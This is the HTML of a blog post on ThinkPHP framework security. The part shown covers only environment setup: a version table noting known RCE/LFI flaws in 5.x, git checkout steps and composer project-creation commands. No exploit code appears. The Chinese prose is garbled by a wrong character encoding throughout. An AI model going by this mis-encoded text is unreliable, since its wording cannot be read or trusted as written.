<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="keywords" content="Hexo Theme Redefine">
    
    <meta name="author" content="sky123">
    
    <!-- Completely eliminate flash of wrong theme -->
    <script>
        (function() {
            const THEME_KEY = "REDEFINE-THEME-STATUS";
            const DARK = "dark", LIGHT = "light";
            
            // Get preferred theme
            function getTheme() {
                try {
                    const saved = localStorage.getItem(THEME_KEY);
                    if (saved) {
                        const { isDark } = JSON.parse(saved);
                        return isDark ? DARK : LIGHT;
                    }
                } catch (e) {}
                
                return matchMedia("(prefers-color-scheme: dark)").matches ? DARK : LIGHT;
            }
            
            // Apply theme to document
            function applyTheme(theme) {
                const isDark = theme === DARK;
                const root = document.documentElement;
                
                // Set data attribute for CSS variables
                root.setAttribute("data-theme", theme);
                
                // Set classes for compatibility
                root.classList.add(theme);
                root.classList.remove(isDark ? LIGHT : DARK);
                root.style.colorScheme = theme;
            }
            
            // Initial application
            const theme = getTheme();
            applyTheme(theme);
            
            // Listen for system preference changes
            matchMedia("(prefers-color-scheme: dark)").addEventListener("change", ({ matches }) => {
                // Only update if using system preference (no localStorage entry)
                if (!localStorage.getItem(THEME_KEY)) {
                    applyTheme(matches ? DARK : LIGHT);
                }
            });
            
            // Set body classes once DOM is ready
            if (document.readyState !== "loading") {
                document.body.classList.add(theme + "-mode");
            } else {
                document.addEventListener("DOMContentLoaded", () => {
                    document.body.classList.add(theme + "-mode");
                    document.body.classList.remove((theme === DARK ? LIGHT : DARK) + "-mode");
                });
            }
        })();
    </script>
    
    <!-- Critical CSS to prevent flash -->
    <style>
        :root[data-theme="dark"] {
            --background-color: #202124;
            --background-color-transparent: rgba(32, 33, 36, 0.6);
            --second-background-color: #2d2e32;
            --third-background-color: #34353a;
            --third-background-color-transparent: rgba(32, 33, 36, 0.6);
            --primary-color: #0066CC;
            --first-text-color: #ffffff;
            --second-text-color: #eeeeee;
            --third-text-color: #bebec6;
            --fourth-text-color: #999999;
            --default-text-color: #bebec6;
            --invert-text-color: #373D3F;
            --border-color: rgba(255, 255, 255, 0.08);
            --selection-color: #0066CC;
            --shadow-color-1: rgba(255, 255, 255, 0.08);
            --shadow-color-2: rgba(255, 255, 255, 0.05);
        }
        
        :root[data-theme="light"] {
            --background-color: #fff;
            --background-color-transparent: rgba(255, 255, 255, 0.6);
            --second-background-color: #f8f8f8;
            --third-background-color: #f2f2f2;
            --third-background-color-transparent: rgba(241, 241, 241, 0.6);
            --primary-color: #0066CC;
            --first-text-color: #16171a;
            --second-text-color: #2f3037;
            --third-text-color: #5e5e5e;
            --fourth-text-color: #eeeeee;
            --default-text-color: #373D3F;
            --invert-text-color: #bebec6;
            --border-color: rgba(0, 0, 0, 0.08);
            --selection-color: #0066CC;
            --shadow-color-1: rgba(0, 0, 0, 0.08);
            --shadow-color-2: rgba(0, 0, 0, 0.05);
        }
        
        body {
            background-color: var(--background-color);
            color: var(--default-text-color);
        }
        
        /* Apply body classes as soon as DOM is ready */
        :root[data-theme="dark"] body {
            background-color: var(--background-color);
            color: var(--default-text-color);
        }
    </style>
    
    <!-- preconnect -->
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>

    
    <!--- Seo Part-->
    
    <link rel="canonical" href="https://skyi23.github.io/2025/07/28/thinkphp æ¡†æ¶å®‰å…¨/"/>
    <meta name="robots" content="index,follow">
    <meta name="googlebot" content="index,follow">
    <meta name="revisit-after" content="1 days">
    
    
    
    
    <!--- Icon Part-->
    <link rel="icon" type="image/png" href="/null" sizes="192x192">
    <link rel="apple-touch-icon" sizes="180x180" href="/null">
    <meta name="theme-color" content="#A31F34">
    <link rel="shortcut icon" href="/null">
    <!--- Page Info-->
    
    <title>
        
            ThinkPHP æ¡†æ¶å®‰å…¨ | sky123&#39;s site
        
    </title>

    
<link rel="stylesheet" href="/fonts/Chillax/chillax.css">


    <!--- Inject Part-->
    

    
<link rel="stylesheet" href="/css/style.css">


    
        
<link rel="stylesheet" href="/css/build/tailwind.css">

    

    
<link rel="stylesheet" href="/fonts/GeistMono/geist-mono.css">

    
<link rel="stylesheet" href="/fonts/Geist/geist.css">

    <!--- Font Part-->
    
    
        <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono&display=swap" rel="stylesheet">
    
    
    
    
    

    <script id="hexo-configurations">
    window.config = {"hostname":"skyi23.github.io","root":"/","language":"en","path":"search.xml"};
    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true,"delete_mask":false,"title_alignment":"left","headings_top_spacing":{"h1":"3.2rem","h2":"2.4rem","h3":"1.9rem","h4":"1.6rem","h5":"1.4rem","h6":"1.3rem"}},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":false,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","highlight_theme":{"light":"github","dark":"vs2015"},"font":{"enable":true,"family":"JetBrains Mono","url":"https://fonts.googleapis.com/css2?family=JetBrains+Mono&display=swap"}},"toc":{"enable":true,"max_depth":5,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"pangu_js":false,"recommendation":{"enable":false,"title":"æ¨èé˜…è¯»","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":null,"default_mode":"light"},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null},"title":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":true,"percentage":true},"website_counter":{"url":"https://cn.vercount.one/js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"preloader":{"enable":false,"custom_message":null},"side_tools":{"gear_rotation":true,"auto_expand":false},"open_graph":{"enable":false,"image":"/images/redefine-og.webp","description":"Hexo Theme Redefine, Redefine Your Hexo Journey."},"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/wallhaven-wqery6-light.webp","dark":"/images/wallhaven-wqery6-dark.webp"},"title":"sky123's blog","subtitle":{"text":["ä¹¦æœ‰æœªæ›¾ç»æˆ‘è¯»ï¼Œäº‹æ— ä¸å¯å¯¹äººè¨€"],"hitokoto":{"enable":false,"show_author":false,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":false,"style":"default","links":{"github":null,"instagram":null,"zhihu":null,"twitter":null,"email":null},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null,"lrc":null}]},"mermaid":{"enable":true,"version":"11.4.1"}},"version":"2.8.5","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"width":{"home":"1200px","pages":"1000px"},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"åˆ†ç±»":{"icon":"fa-solid fa-folder","path":"/categories/"},"æ ‡ç­¾":{"icon":"fa-solid fa-tags","path":"/tags/"},"ä¹¦ç­¾":{"icon":"fa-solid fa-bookmark","path":"/bookmarks/"}},"search":{"enable":true,"preload":true}},"page_templates":{"bookmarks_column":3,"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"show_on_mobile":true,"links":null},"article_date_format":"auto","excerpt_length":200,"categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3}},"footerStart":"2024/11/7 00:00:00"};
    window.lang_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
    window.data = {"masonry":false};
  </script>
    
    <!--- Fontawesome Part-->
    
<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">

    
<link rel="stylesheet" href="/fontawesome/brands.min.css">

    
<link rel="stylesheet" href="/fontawesome/solid.min.css">

    
<link rel="stylesheet" href="/fontawesome/regular.min.css">

    
    
    
    
<!-- hexo injector head_end start --><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.15.3/dist/katex.min.css" integrity="sha256-TThEtR+XalhWKkfF383YLOrI50NGNeIqrzS+q08afrY=" crossorigin="anonymous"><!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.3.0"></head>



<body>
	<div class="progress-bar-container">
	
	<span class="scroll-progress-bar"></span>
	

	
	<span class="pjax-progress-bar"></span>
	<!--        <span class="swup-progress-icon">-->
	<!--            <i class="fa-solid fa-circle-notch fa-spin"></i>-->
	<!--        </span>-->
	
</div>

<main class="page-container" id="swup">

	

	<div class="main-content-container flex flex-col justify-between min-h-dvh">
		<div class="main-content-header">
			<header class="navbar-container px-6 md:px-12">
    <div class="navbar-content transition-navbar ">
        <div class="left">
            
            <a class="logo-title" href="/">
                
                sky123&#39;s site
                
            </a>
        </div>

        <div class="right">
            <!-- PC -->
            <div class="desktop">
                <ul class="navbar-list">
                    
                        
                            

                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class=""
                                   href="/"
                                        >
                                    <i class="fa-regular fa-house fa-fw"></i>
                                    HOME
                                    
                                </a>

                                <!-- Submenu -->
                                
                            </li>
                    
                        
                            

                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class=""
                                   href="/categories/"
                                        >
                                    <i class="fa-solid fa-folder fa-fw"></i>
                                    åˆ†ç±»
                                    
                                </a>

                                <!-- Submenu -->
                                
                            </li>
                    
                        
                            

                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class=""
                                   href="/tags/"
                                        >
                                    <i class="fa-solid fa-tags fa-fw"></i>
                                    æ ‡ç­¾
                                    
                                </a>

                                <!-- Submenu -->
                                
                            </li>
                    
                        
                            

                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class=""
                                   href="/bookmarks/"
                                        >
                                    <i class="fa-solid fa-bookmark fa-fw"></i>
                                    ä¹¦ç­¾
                                    
                                </a>

                                <!-- Submenu -->
                                
                            </li>
                    
                    
                        <li class="navbar-item search search-popup-trigger">
                            <i class="fa-solid fa-magnifying-glass"></i>
                        </li>
                    
                </ul>
            </div>
            <!-- Mobile -->
            <div class="mobile">
                
                    <div class="icon-item search search-popup-trigger"><i class="fa-solid fa-magnifying-glass"></i>
                    </div>
                
                <div class="icon-item navbar-bar">
                    <div class="navbar-bar-middle"></div>
                </div>
            </div>
        </div>
    </div>

    <!-- Mobile sheet -->
    <div class="navbar-drawer h-dvh w-full absolute top-0 left-0 bg-background-color flex flex-col justify-between">
        <ul class="drawer-navbar-list flex flex-col px-4 justify-center items-start">
            
                
                    

                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
                           href="/"
                        >
                            <span>
                                HOME
                            </span>
                            
                                <i class="fa-regular fa-house fa-sm fa-fw"></i>
                            
                        </a>
                        

                        
                    </li>
            
                
                    

                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
                           href="/categories/"
                        >
                            <span>
                                åˆ†ç±»
                            </span>
                            
                                <i class="fa-solid fa-folder fa-sm fa-fw"></i>
                            
                        </a>
                        

                        
                    </li>
            
                
                    

                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
                           href="/tags/"
                        >
                            <span>
                                æ ‡ç­¾
                            </span>
                            
                                <i class="fa-solid fa-tags fa-sm fa-fw"></i>
                            
                        </a>
                        

                        
                    </li>
            
                
                    

                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
                           href="/bookmarks/"
                        >
                            <span>
                                ä¹¦ç­¾
                            </span>
                            
                                <i class="fa-solid fa-bookmark fa-sm fa-fw"></i>
                            
                        </a>
                        

                        
                    </li>
            

            
            
        </ul>

        <div class="statistics flex justify-around my-2.5">
    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/tags">
        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">14</div>
        <div class="label text-third-text-color text-sm">Tags</div>
    </a>
    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/categories">
        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">17</div>
        <div class="label text-third-text-color text-sm">Categories</div>
    </a>
    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/archives">
        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">56</div>
        <div class="label text-third-text-color text-sm">Posts</div>
    </a>
</div>
    </div>

    <div class="window-mask"></div>

</header>


		</div>

		<div class="main-content-body transition-fade-up">
			

			<div class="main-content">
				<div class="post-page-container flex relative justify-between box-border w-full h-full">
	<div class="article-content-container">

		<div class="article-title relative w-full">
			
			<div class="w-full flex items-center pt-6 justify-start">
				<h1 class="article-title-regular text-second-text-color tracking-tight text-4xl md:text-6xl font-semibold px-2 sm:px-6 md:px-8 py-3">ThinkPHP æ¡†æ¶å®‰å…¨</h1>
			</div>
			
		</div>

		
		<div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
			<div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
				<img src="/images/icon.jpg">
			</div>
			<div class="info flex flex-col justify-between">
				<div class="author flex items-center">
					<span class="name text-default-text-color text-lg font-semibold">sky123</span>
					
				</div>
				<div class="meta-info">
					<div class="article-meta-info">
    <span class="article-date article-meta-item">
        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
        <span class="desktop">2025-07-28 23:10:49</span>
        <span class="mobile">2025-07-28 23:10:49</span>
        <span class="hover-info">Created</span>
    </span>
    
        <span class="article-date article-meta-item">
            <i class="fa-regular fa-wrench"></i>&nbsp;
            <span class="desktop">2025-08-19 01:11:42</span>
            <span class="mobile">2025-08-19 01:11:42</span>
            <span class="hover-info">Updated</span>
        </span>
    

    
        <span class="article-categories article-meta-item">
            <i class="fa-regular fa-folders"></i>&nbsp;
            <ul>
                
                
                    
                        
                        <li>
                            <a href="/categories/web/">web</a>&nbsp;
                        </li>
                    
                    
                
                    
                        
                            <li>></li>
                        
                        <li>
                            <a href="/categories/web/php-web/">php web</a>&nbsp;
                        </li>
                    
                    
                
            </ul>
        </span>
    
    
        <span class="article-tags article-meta-item">
            <i class="fa-regular fa-tags"></i>&nbsp;
            <ul>
                
                    <li>
                        <a href="/tags/php-web/">php web</a>&nbsp;
                    </li>
                
            </ul>
        </span>
    

    
    
        <span class="article-wordcount article-meta-item">
            <i class="fa-regular fa-typewriter"></i>&nbsp;<span>22.9k Words</span>
        </span>
    
    
        <span class="article-min2read article-meta-item">
            <i class="fa-regular fa-clock"></i>&nbsp;<span>109 Mins</span>
        </span>
    
    
        <span class="article-pv article-meta-item">
            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
        </span>
    
</div>

				</div>
			</div>
		</div>
		

		


		<div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
			<p><strong>ThinkPHP</strong> æ˜¯ä¸­å›½å¼€å‘è€…å¹¿æ³›ä½¿ç”¨çš„ä¸€æ¬¾ <strong>å¼€æº PHP æ¡†æ¶</strong>ï¼Œç”± <strong>TopThink å›¢é˜Ÿ</strong> å¼€å‘ï¼Œç›®æ ‡æ˜¯è®©å¼€å‘æ›´å¿«ã€æ›´ç®€å•ã€‚å®ƒéµå¾ª <strong>MVCï¼ˆModel-View-Controllerï¼‰è®¾è®¡æ¨¡å¼</strong>ï¼Œå…·æœ‰è‰¯å¥½çš„ä»£ç ç»„ç»‡ã€æ•°æ®åº“æ“ä½œå°è£…ã€æ¨¡æ¿å¼•æ“ç­‰ç‰¹æ€§ã€‚</p>
<p>ThinkPHP ç‰ˆæœ¬æ¶æ„ï¼š</p>
<table>
<thead>
<tr>
<th>ç‰ˆæœ¬</th>
<th>çŠ¶æ€</th>
<th>æœ€ä½ PHP</th>
<th>è¯´æ˜</th>
</tr>
</thead>
<tbody><tr>
<td><strong>8.x</strong></td>
<td>æœ€æ–°ç¨³å®šï¼Œå®˜æ–¹æ¨è</td>
<td>â‰¥â€¯PHPâ€¯8.1</td>
<td>å…¨é¢ PSR æ ‡å‡†ã€å¼ºç±»å‹ã€å±æ€§æ³¨è§£ï¼Œç»Ÿä¸€é…ç½®ç³»ç»Ÿï¼Œå†…ç½® FPM&#x2F;Swow åŒè¿è¡Œæ—¶æ”¯æŒã€‚æ€§èƒ½å¢å¼ºï¼Œé€‚é…ç°ä»£ PHP é¡¹ç›®ã€‚</td>
</tr>
<tr>
<td><strong>6.1.x</strong></td>
<td>é•¿æœŸç»´æŠ¤ (LTS)</td>
<td>â‰¥â€¯PHPâ€¯7.4</td>
<td>ç¤¾åŒºä½¿ç”¨æœ€å¹¿ï¼Œæ’ä»¶æ•™ç¨‹ä¸°å¯Œï¼Œæ¶æ„æ¸…æ™°ç¨³å®šï¼Œé€‚åˆä¸­å¤§å‹é¡¹ç›®å’Œä¼ä¸šæ¡†æ¶åŸºç¡€ã€‚</td>
</tr>
<tr>
<td>5.1&#x2F;5.0</td>
<td>ä»…å®‰å…¨ç»´æŠ¤</td>
<td>â‰¥â€¯PHPâ€¯5.6</td>
<td>è€é¡¹ç›®å…¼å®¹æ€§å¥½ï¼Œ<strong>å­˜åœ¨å¤šèµ·å·²çŸ¥æ¼æ´</strong>ï¼ˆå¦‚ RCE&#x2F;LFI ç­‰ï¼‰ï¼Œ<strong>ä¸æ¨èç”¨äºæ–°é¡¹ç›®å¼€å‘</strong>ã€‚</td>
</tr>
</tbody></table>
<p>ThinkPHP çš„æºç æ‰˜ç®¡åœ¨ GitHub ä¸Šï¼š</p>
<ul>
<li><p><strong>ThinkPHP 5.x å’Œä»¥ä¸‹</strong>ç‰ˆæœ¬çš„æºç ä¸»ä»“åº“ä½äº <a class="link"   target="_blank" rel="noopener" href="https://github.com/top-think/framework%E3%80%82%E4%B8%8D%E5%90%8C%E7%89%88%E6%9C%AC%E4%BB%A5" >https://github.com/top-think/frameworkã€‚ä¸åŒç‰ˆæœ¬ä»¥<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> <code>tag</code> çš„å½¢å¼ç®¡ç†ã€‚</p>
</li>
<li><p><strong>ThinkPHP 6</strong> èµ·è¿›è¡Œäº†æ¶æ„é‡ç»„ï¼Œå¹¶è¿ç§»åˆ°æ–°çš„ç»„ç»‡ä¸‹ï¼Œä¸»ä»“åº“æ˜¯ï¼š<a class="link"   target="_blank" rel="noopener" href="https://github.com/top-think/think%E3%80%82" >https://github.com/top-think/thinkã€‚<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
</li>
</ul>
<p>åœ¨åˆ†ææ—¶æˆ‘ä»¬å…ˆæŠŠé¡¹ç›®æºç ä¸‹è½½ä¸‹æ¥ï¼Œç„¶åé€šè¿‡ <code>git</code> åˆ‡æ¢åˆ°å¯¹åº”çš„ç‰ˆæœ¬ä¸Šã€‚</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># å…‹éš†ä»“åº“</span></span><br><span class="line">git <span class="built_in">clone</span> https://github.com/top-think/framework.git thinkphp</span><br><span class="line"><span class="built_in">cd</span> thinkphp</span><br><span class="line"></span><br><span class="line"><span class="comment"># æŸ¥çœ‹æœ‰å“ªäº›ç‰ˆæœ¬æ ‡ç­¾</span></span><br><span class="line">git tag</span><br><span class="line"></span><br><span class="line"><span class="comment"># åˆ‡æ¢åˆ°æŸä¸ªç‰ˆæœ¬ï¼ˆä¾‹å¦‚ ThinkPHP 5.0.24ï¼‰</span></span><br><span class="line">git checkout 5.0.24</span><br></pre></td></tr></table></figure></div>

<h1 id="ç¯å¢ƒåŸºç¡€"><a href="#ç¯å¢ƒåŸºç¡€" class="headerlink" title="ç¯å¢ƒåŸºç¡€"></a>ç¯å¢ƒåŸºç¡€</h1><h2 id="é¡¹ç›®åˆ›å»º"><a href="#é¡¹ç›®åˆ›å»º" class="headerlink" title="é¡¹ç›®åˆ›å»º"></a>é¡¹ç›®åˆ›å»º</h2><p><strong>ThinkPHP è‡ª 5.1 èµ·å°±å…¨é¢ Composer åŒ–</strong>ï¼Œæ¡†æ¶æœ¬ä½“è¢«æ‹†åˆ†ä¸ºå¤šä¸ªç»„ä»¶ï¼Œå¦‚ <code>topthink/framework</code>ã€<code>topthink/think-orm</code> ç­‰ï¼›ç‰ˆæœ¬å·å‘å¸ƒç»Ÿä¸€åœ¨ <a class="link"   target="_blank" rel="noopener" href="https://packagist.org/packages/topthink/framework" >Packagist<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> ä¸Šç»´æŠ¤ã€‚</p>
<blockquote>
<p>Packagist æ˜¯ Composer çš„å®˜æ–¹åŒ…ä»“åº“ï¼Œæ‰€æœ‰ PHP åŒ…ï¼ˆç±»åº“ã€æ¡†æ¶ã€æ’ä»¶ç­‰ï¼‰é»˜è®¤éƒ½ä»è¿™é‡Œä¸‹è½½å®‰è£…ã€‚</p>
</blockquote>
<p>ç”±äº ThinkPHP çš„æ¯ä¸ªç‰ˆæœ¬éƒ½å¯èƒ½ä½¿ç”¨ä¸åŒçš„ä¾èµ–ã€å®¹å™¨ã€äº‹ä»¶ç³»ç»Ÿï¼Œ<strong>æ‰‹åŠ¨æ”¾æºç æ— æ³•è¿˜åŸç¯å¢ƒå·®å¼‚</strong>ã€‚å› æ­¤ <strong>ThinkPHP å®˜æ–¹æ¨èä½¿ç”¨ Composer æ¥åˆ›å»ºå’Œç®¡ç† ThinkPHP é¡¹ç›®</strong>ã€‚</p>
<p>æˆ‘ä»¬å¯ä»¥é€šè¿‡ä¸‹é¢è¿™æ¡å‘½ä»¤åˆ›å»ºä¸€ä¸ªæŒ‡å®šç‰ˆæœ¬çš„ ThinkPHP é¡¹ç›®ã€‚</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer create-project topthink/think=ç‰ˆæœ¬å· ç›®å½•å</span><br></pre></td></tr></table></figure></div>

<p>ä¾‹å¦‚ï¼š</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">composer create-project topthink/think=5.0.23 tp5-test</span><br><span class="line">composer create-project topthink/think=5.1.41 tp51-test</span><br><span class="line">composer create-project topthink/think=6.0.* tp6-test</span><br></pre></td></tr></table></figure></div>


  <div class="note-large blue">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>æç¤º</p>

    </div>
    <div class="notel-content markdown-body">
      <p>Composer é»˜è®¤ä¼šè‡ªåŠ¨è¯†åˆ«ä½ çš„ PHP ç‰ˆæœ¬ï¼Œæ¥åˆ¤æ–­æ˜¯å¦æ”¯æŒè¯¥ç‰ˆæœ¬çš„ ThinkPHPã€‚å¦‚æœç‰ˆæœ¬ä¸æ»¡è¶³ï¼Œå®ƒä¼šæŠ¥é”™æˆ–é™çº§ã€‚å…¶ä¸­ ThinkPHP çš„ç‰ˆæœ¬å·å¯ä»¥é€šè¿‡ Composer å‘½ä»¤è¡ŒæŸ¥è¯¢ï¼š</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer show topthink/framework --all</span><br></pre></td></tr></table></figure></div>

<p>ç›®å‰æ”¯æŒçš„ç‰ˆæœ¬æœ‰ï¼š</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">versions : dev-master, 8.x-dev, v8.1.3, v8.1.2, v8.1.1, v8.1.0, v8.0.4, v8.0.3, v8.0.2, v8.0.1, v8.0.0, v8.0.0-beta, 6.1.x-dev, v6.1.5, v6.1.4, v6.1.3, v6.1.2, v6.1.1, v6.1.0, 6.0.x-dev, v6.0.16, v6.0.15, v6.0.14, v6.0.13, v6.0.12, v6.0.11, v6.0.10, v6.0.9, v6.0.8, v6.0.7, v6.0.6, v6.0.5, v6.0.4, v6.0.3, v6.0.2, v6.0.1, v6.0.0, v6.0.0-rc5, v6.0.0-rc4, v6.0.0-rc3, v6.0.0-rc2, v5.2-rc1, v5.2-beta.3, v5.2-beta.2, 5.1.x-dev, v5.1.42, v5.1.41, v5.1.40, v5.1.39, v5.1.38.1, v5.1.38, v5.1.37.1, v5.1.37, v5.1.36, v5.1.35, v5.1.34, v5.1.33, v5.1.32, v5.1.31, v5.1.30, v5.1.29, v5.1.28, v5.1.27, v5.1.26, v5.1.25, v5.1.24, v5.1.23, v5.1.22, v5.1.21, v5.1.20, v5.1.19, v5.1.18, v5.1.17, v5.1.16, v5.1.15, v5.1.14, v5.1.13, v5.1.12, v5.1.11, v5.1.10, v5.1.9, v5.1.8, v5.1.7, v5.1.6, v5.1.5, v5.1.4, v5.1.3, v5.1.2, v5.1.1, v5.1.0, v5.1-rc.3, v5.1-rc.2, v5.1-rc.1, v5.1-beta.1, v5.0.25, v5.0.24, v5.0.23, v5.0.22, v5.0.21, v5.0.20, v5.0.19, v5.0.18, v5.0.17, v5.0.16, v5.0.15, v5.0.14, v5.0.13, v5.0.12, v5.0.11, v5.0.10, v5.0.9, v5.0.8, v5.0.7, v5.0.6, v5.0.5, v5.0.4, v5.0.3, v5.0.2, v5.0.1, 5.0, 5.0-rc4, 5.0-rc3, 5.0-rc2, 5.0-rc1</span><br></pre></td></tr></table></figure></div>

    </div>
  </div>

<p>å¦å¤–ä¾‹å¦‚ <code>topthink/think=5.0.23</code> è¡¨ç¤ºçš„æ˜¯è¿™ä¸ªã€Œ<strong>é¡¹ç›®æ¨¡æ¿åŒ…</strong>ã€çš„ç‰ˆæœ¬å·æ˜¯ 5.0.23ï¼Œè€Œ ThinkPHP çš„ç‰ˆæœ¬å·æŒ‡çš„æ˜¯ <code>topthink/framework</code>ï¼ˆä¹Ÿå°±æ˜¯ ThinkPHP æ¡†æ¶æ ¸å¿ƒä»£ç ï¼‰çš„ç‰ˆæœ¬å·ï¼Œè¿™ä¸ªå¹¶æ²¡æœ‰ç›´æ¥æŒ‡å®šã€‚æˆ‘ä»¬å¯ä»¥é€šè¿‡ä¸‹é¢è¿™æ¡å‘½ä»¤æŸ¥çœ‹ <code>topthink/framework</code> çš„å®é™…ç‰ˆæœ¬ã€‚</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer show topthink/framework</span><br></pre></td></tr></table></figure></div>

<p>ä¹Ÿå°±æ˜¯è¯´ä¸‹é¢è¿™æ¡å‘½ä»¤è¡¨ç¤ºâ€œæˆ‘è¦ç”¨ä¸€ä¸ªç¬¦åˆ ThinkPHP 5.0.23 é¡¹ç›®ç»“æ„çš„æ¨¡æ¿åˆ›å»ºé¡¹ç›®â€ã€‚</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer create-project topthink/think=5.0.23 tp5-test</span><br></pre></td></tr></table></figure></div>

<p>è€Œå®ƒä¾èµ–çš„ <code>topthink/framework</code> ç‰ˆæœ¬æ˜¯ç”±è¿™ä¸ªæ¨¡æ¿çš„ <code>composer.json</code> å†³å®šã€‚</p>
<div class="code-container" data-rel="Json"><figure class="iseeu highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">&quot;topthink/framework&quot;</span><span class="punctuation">:</span> <span class="string">&quot;5.0.*&quot;</span></span><br></pre></td></tr></table></figure></div>

<p>è¿™ä¸ªå®é™…ä¸Šä¹Ÿå¯ä»¥é€šè¿‡ä¸‹é¢è¿™æ¡å‘½ä»¤æŸ¥è¯¢ï¼š</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer show topthink/think 5.0.24 --all</span><br></pre></td></tr></table></figure></div>

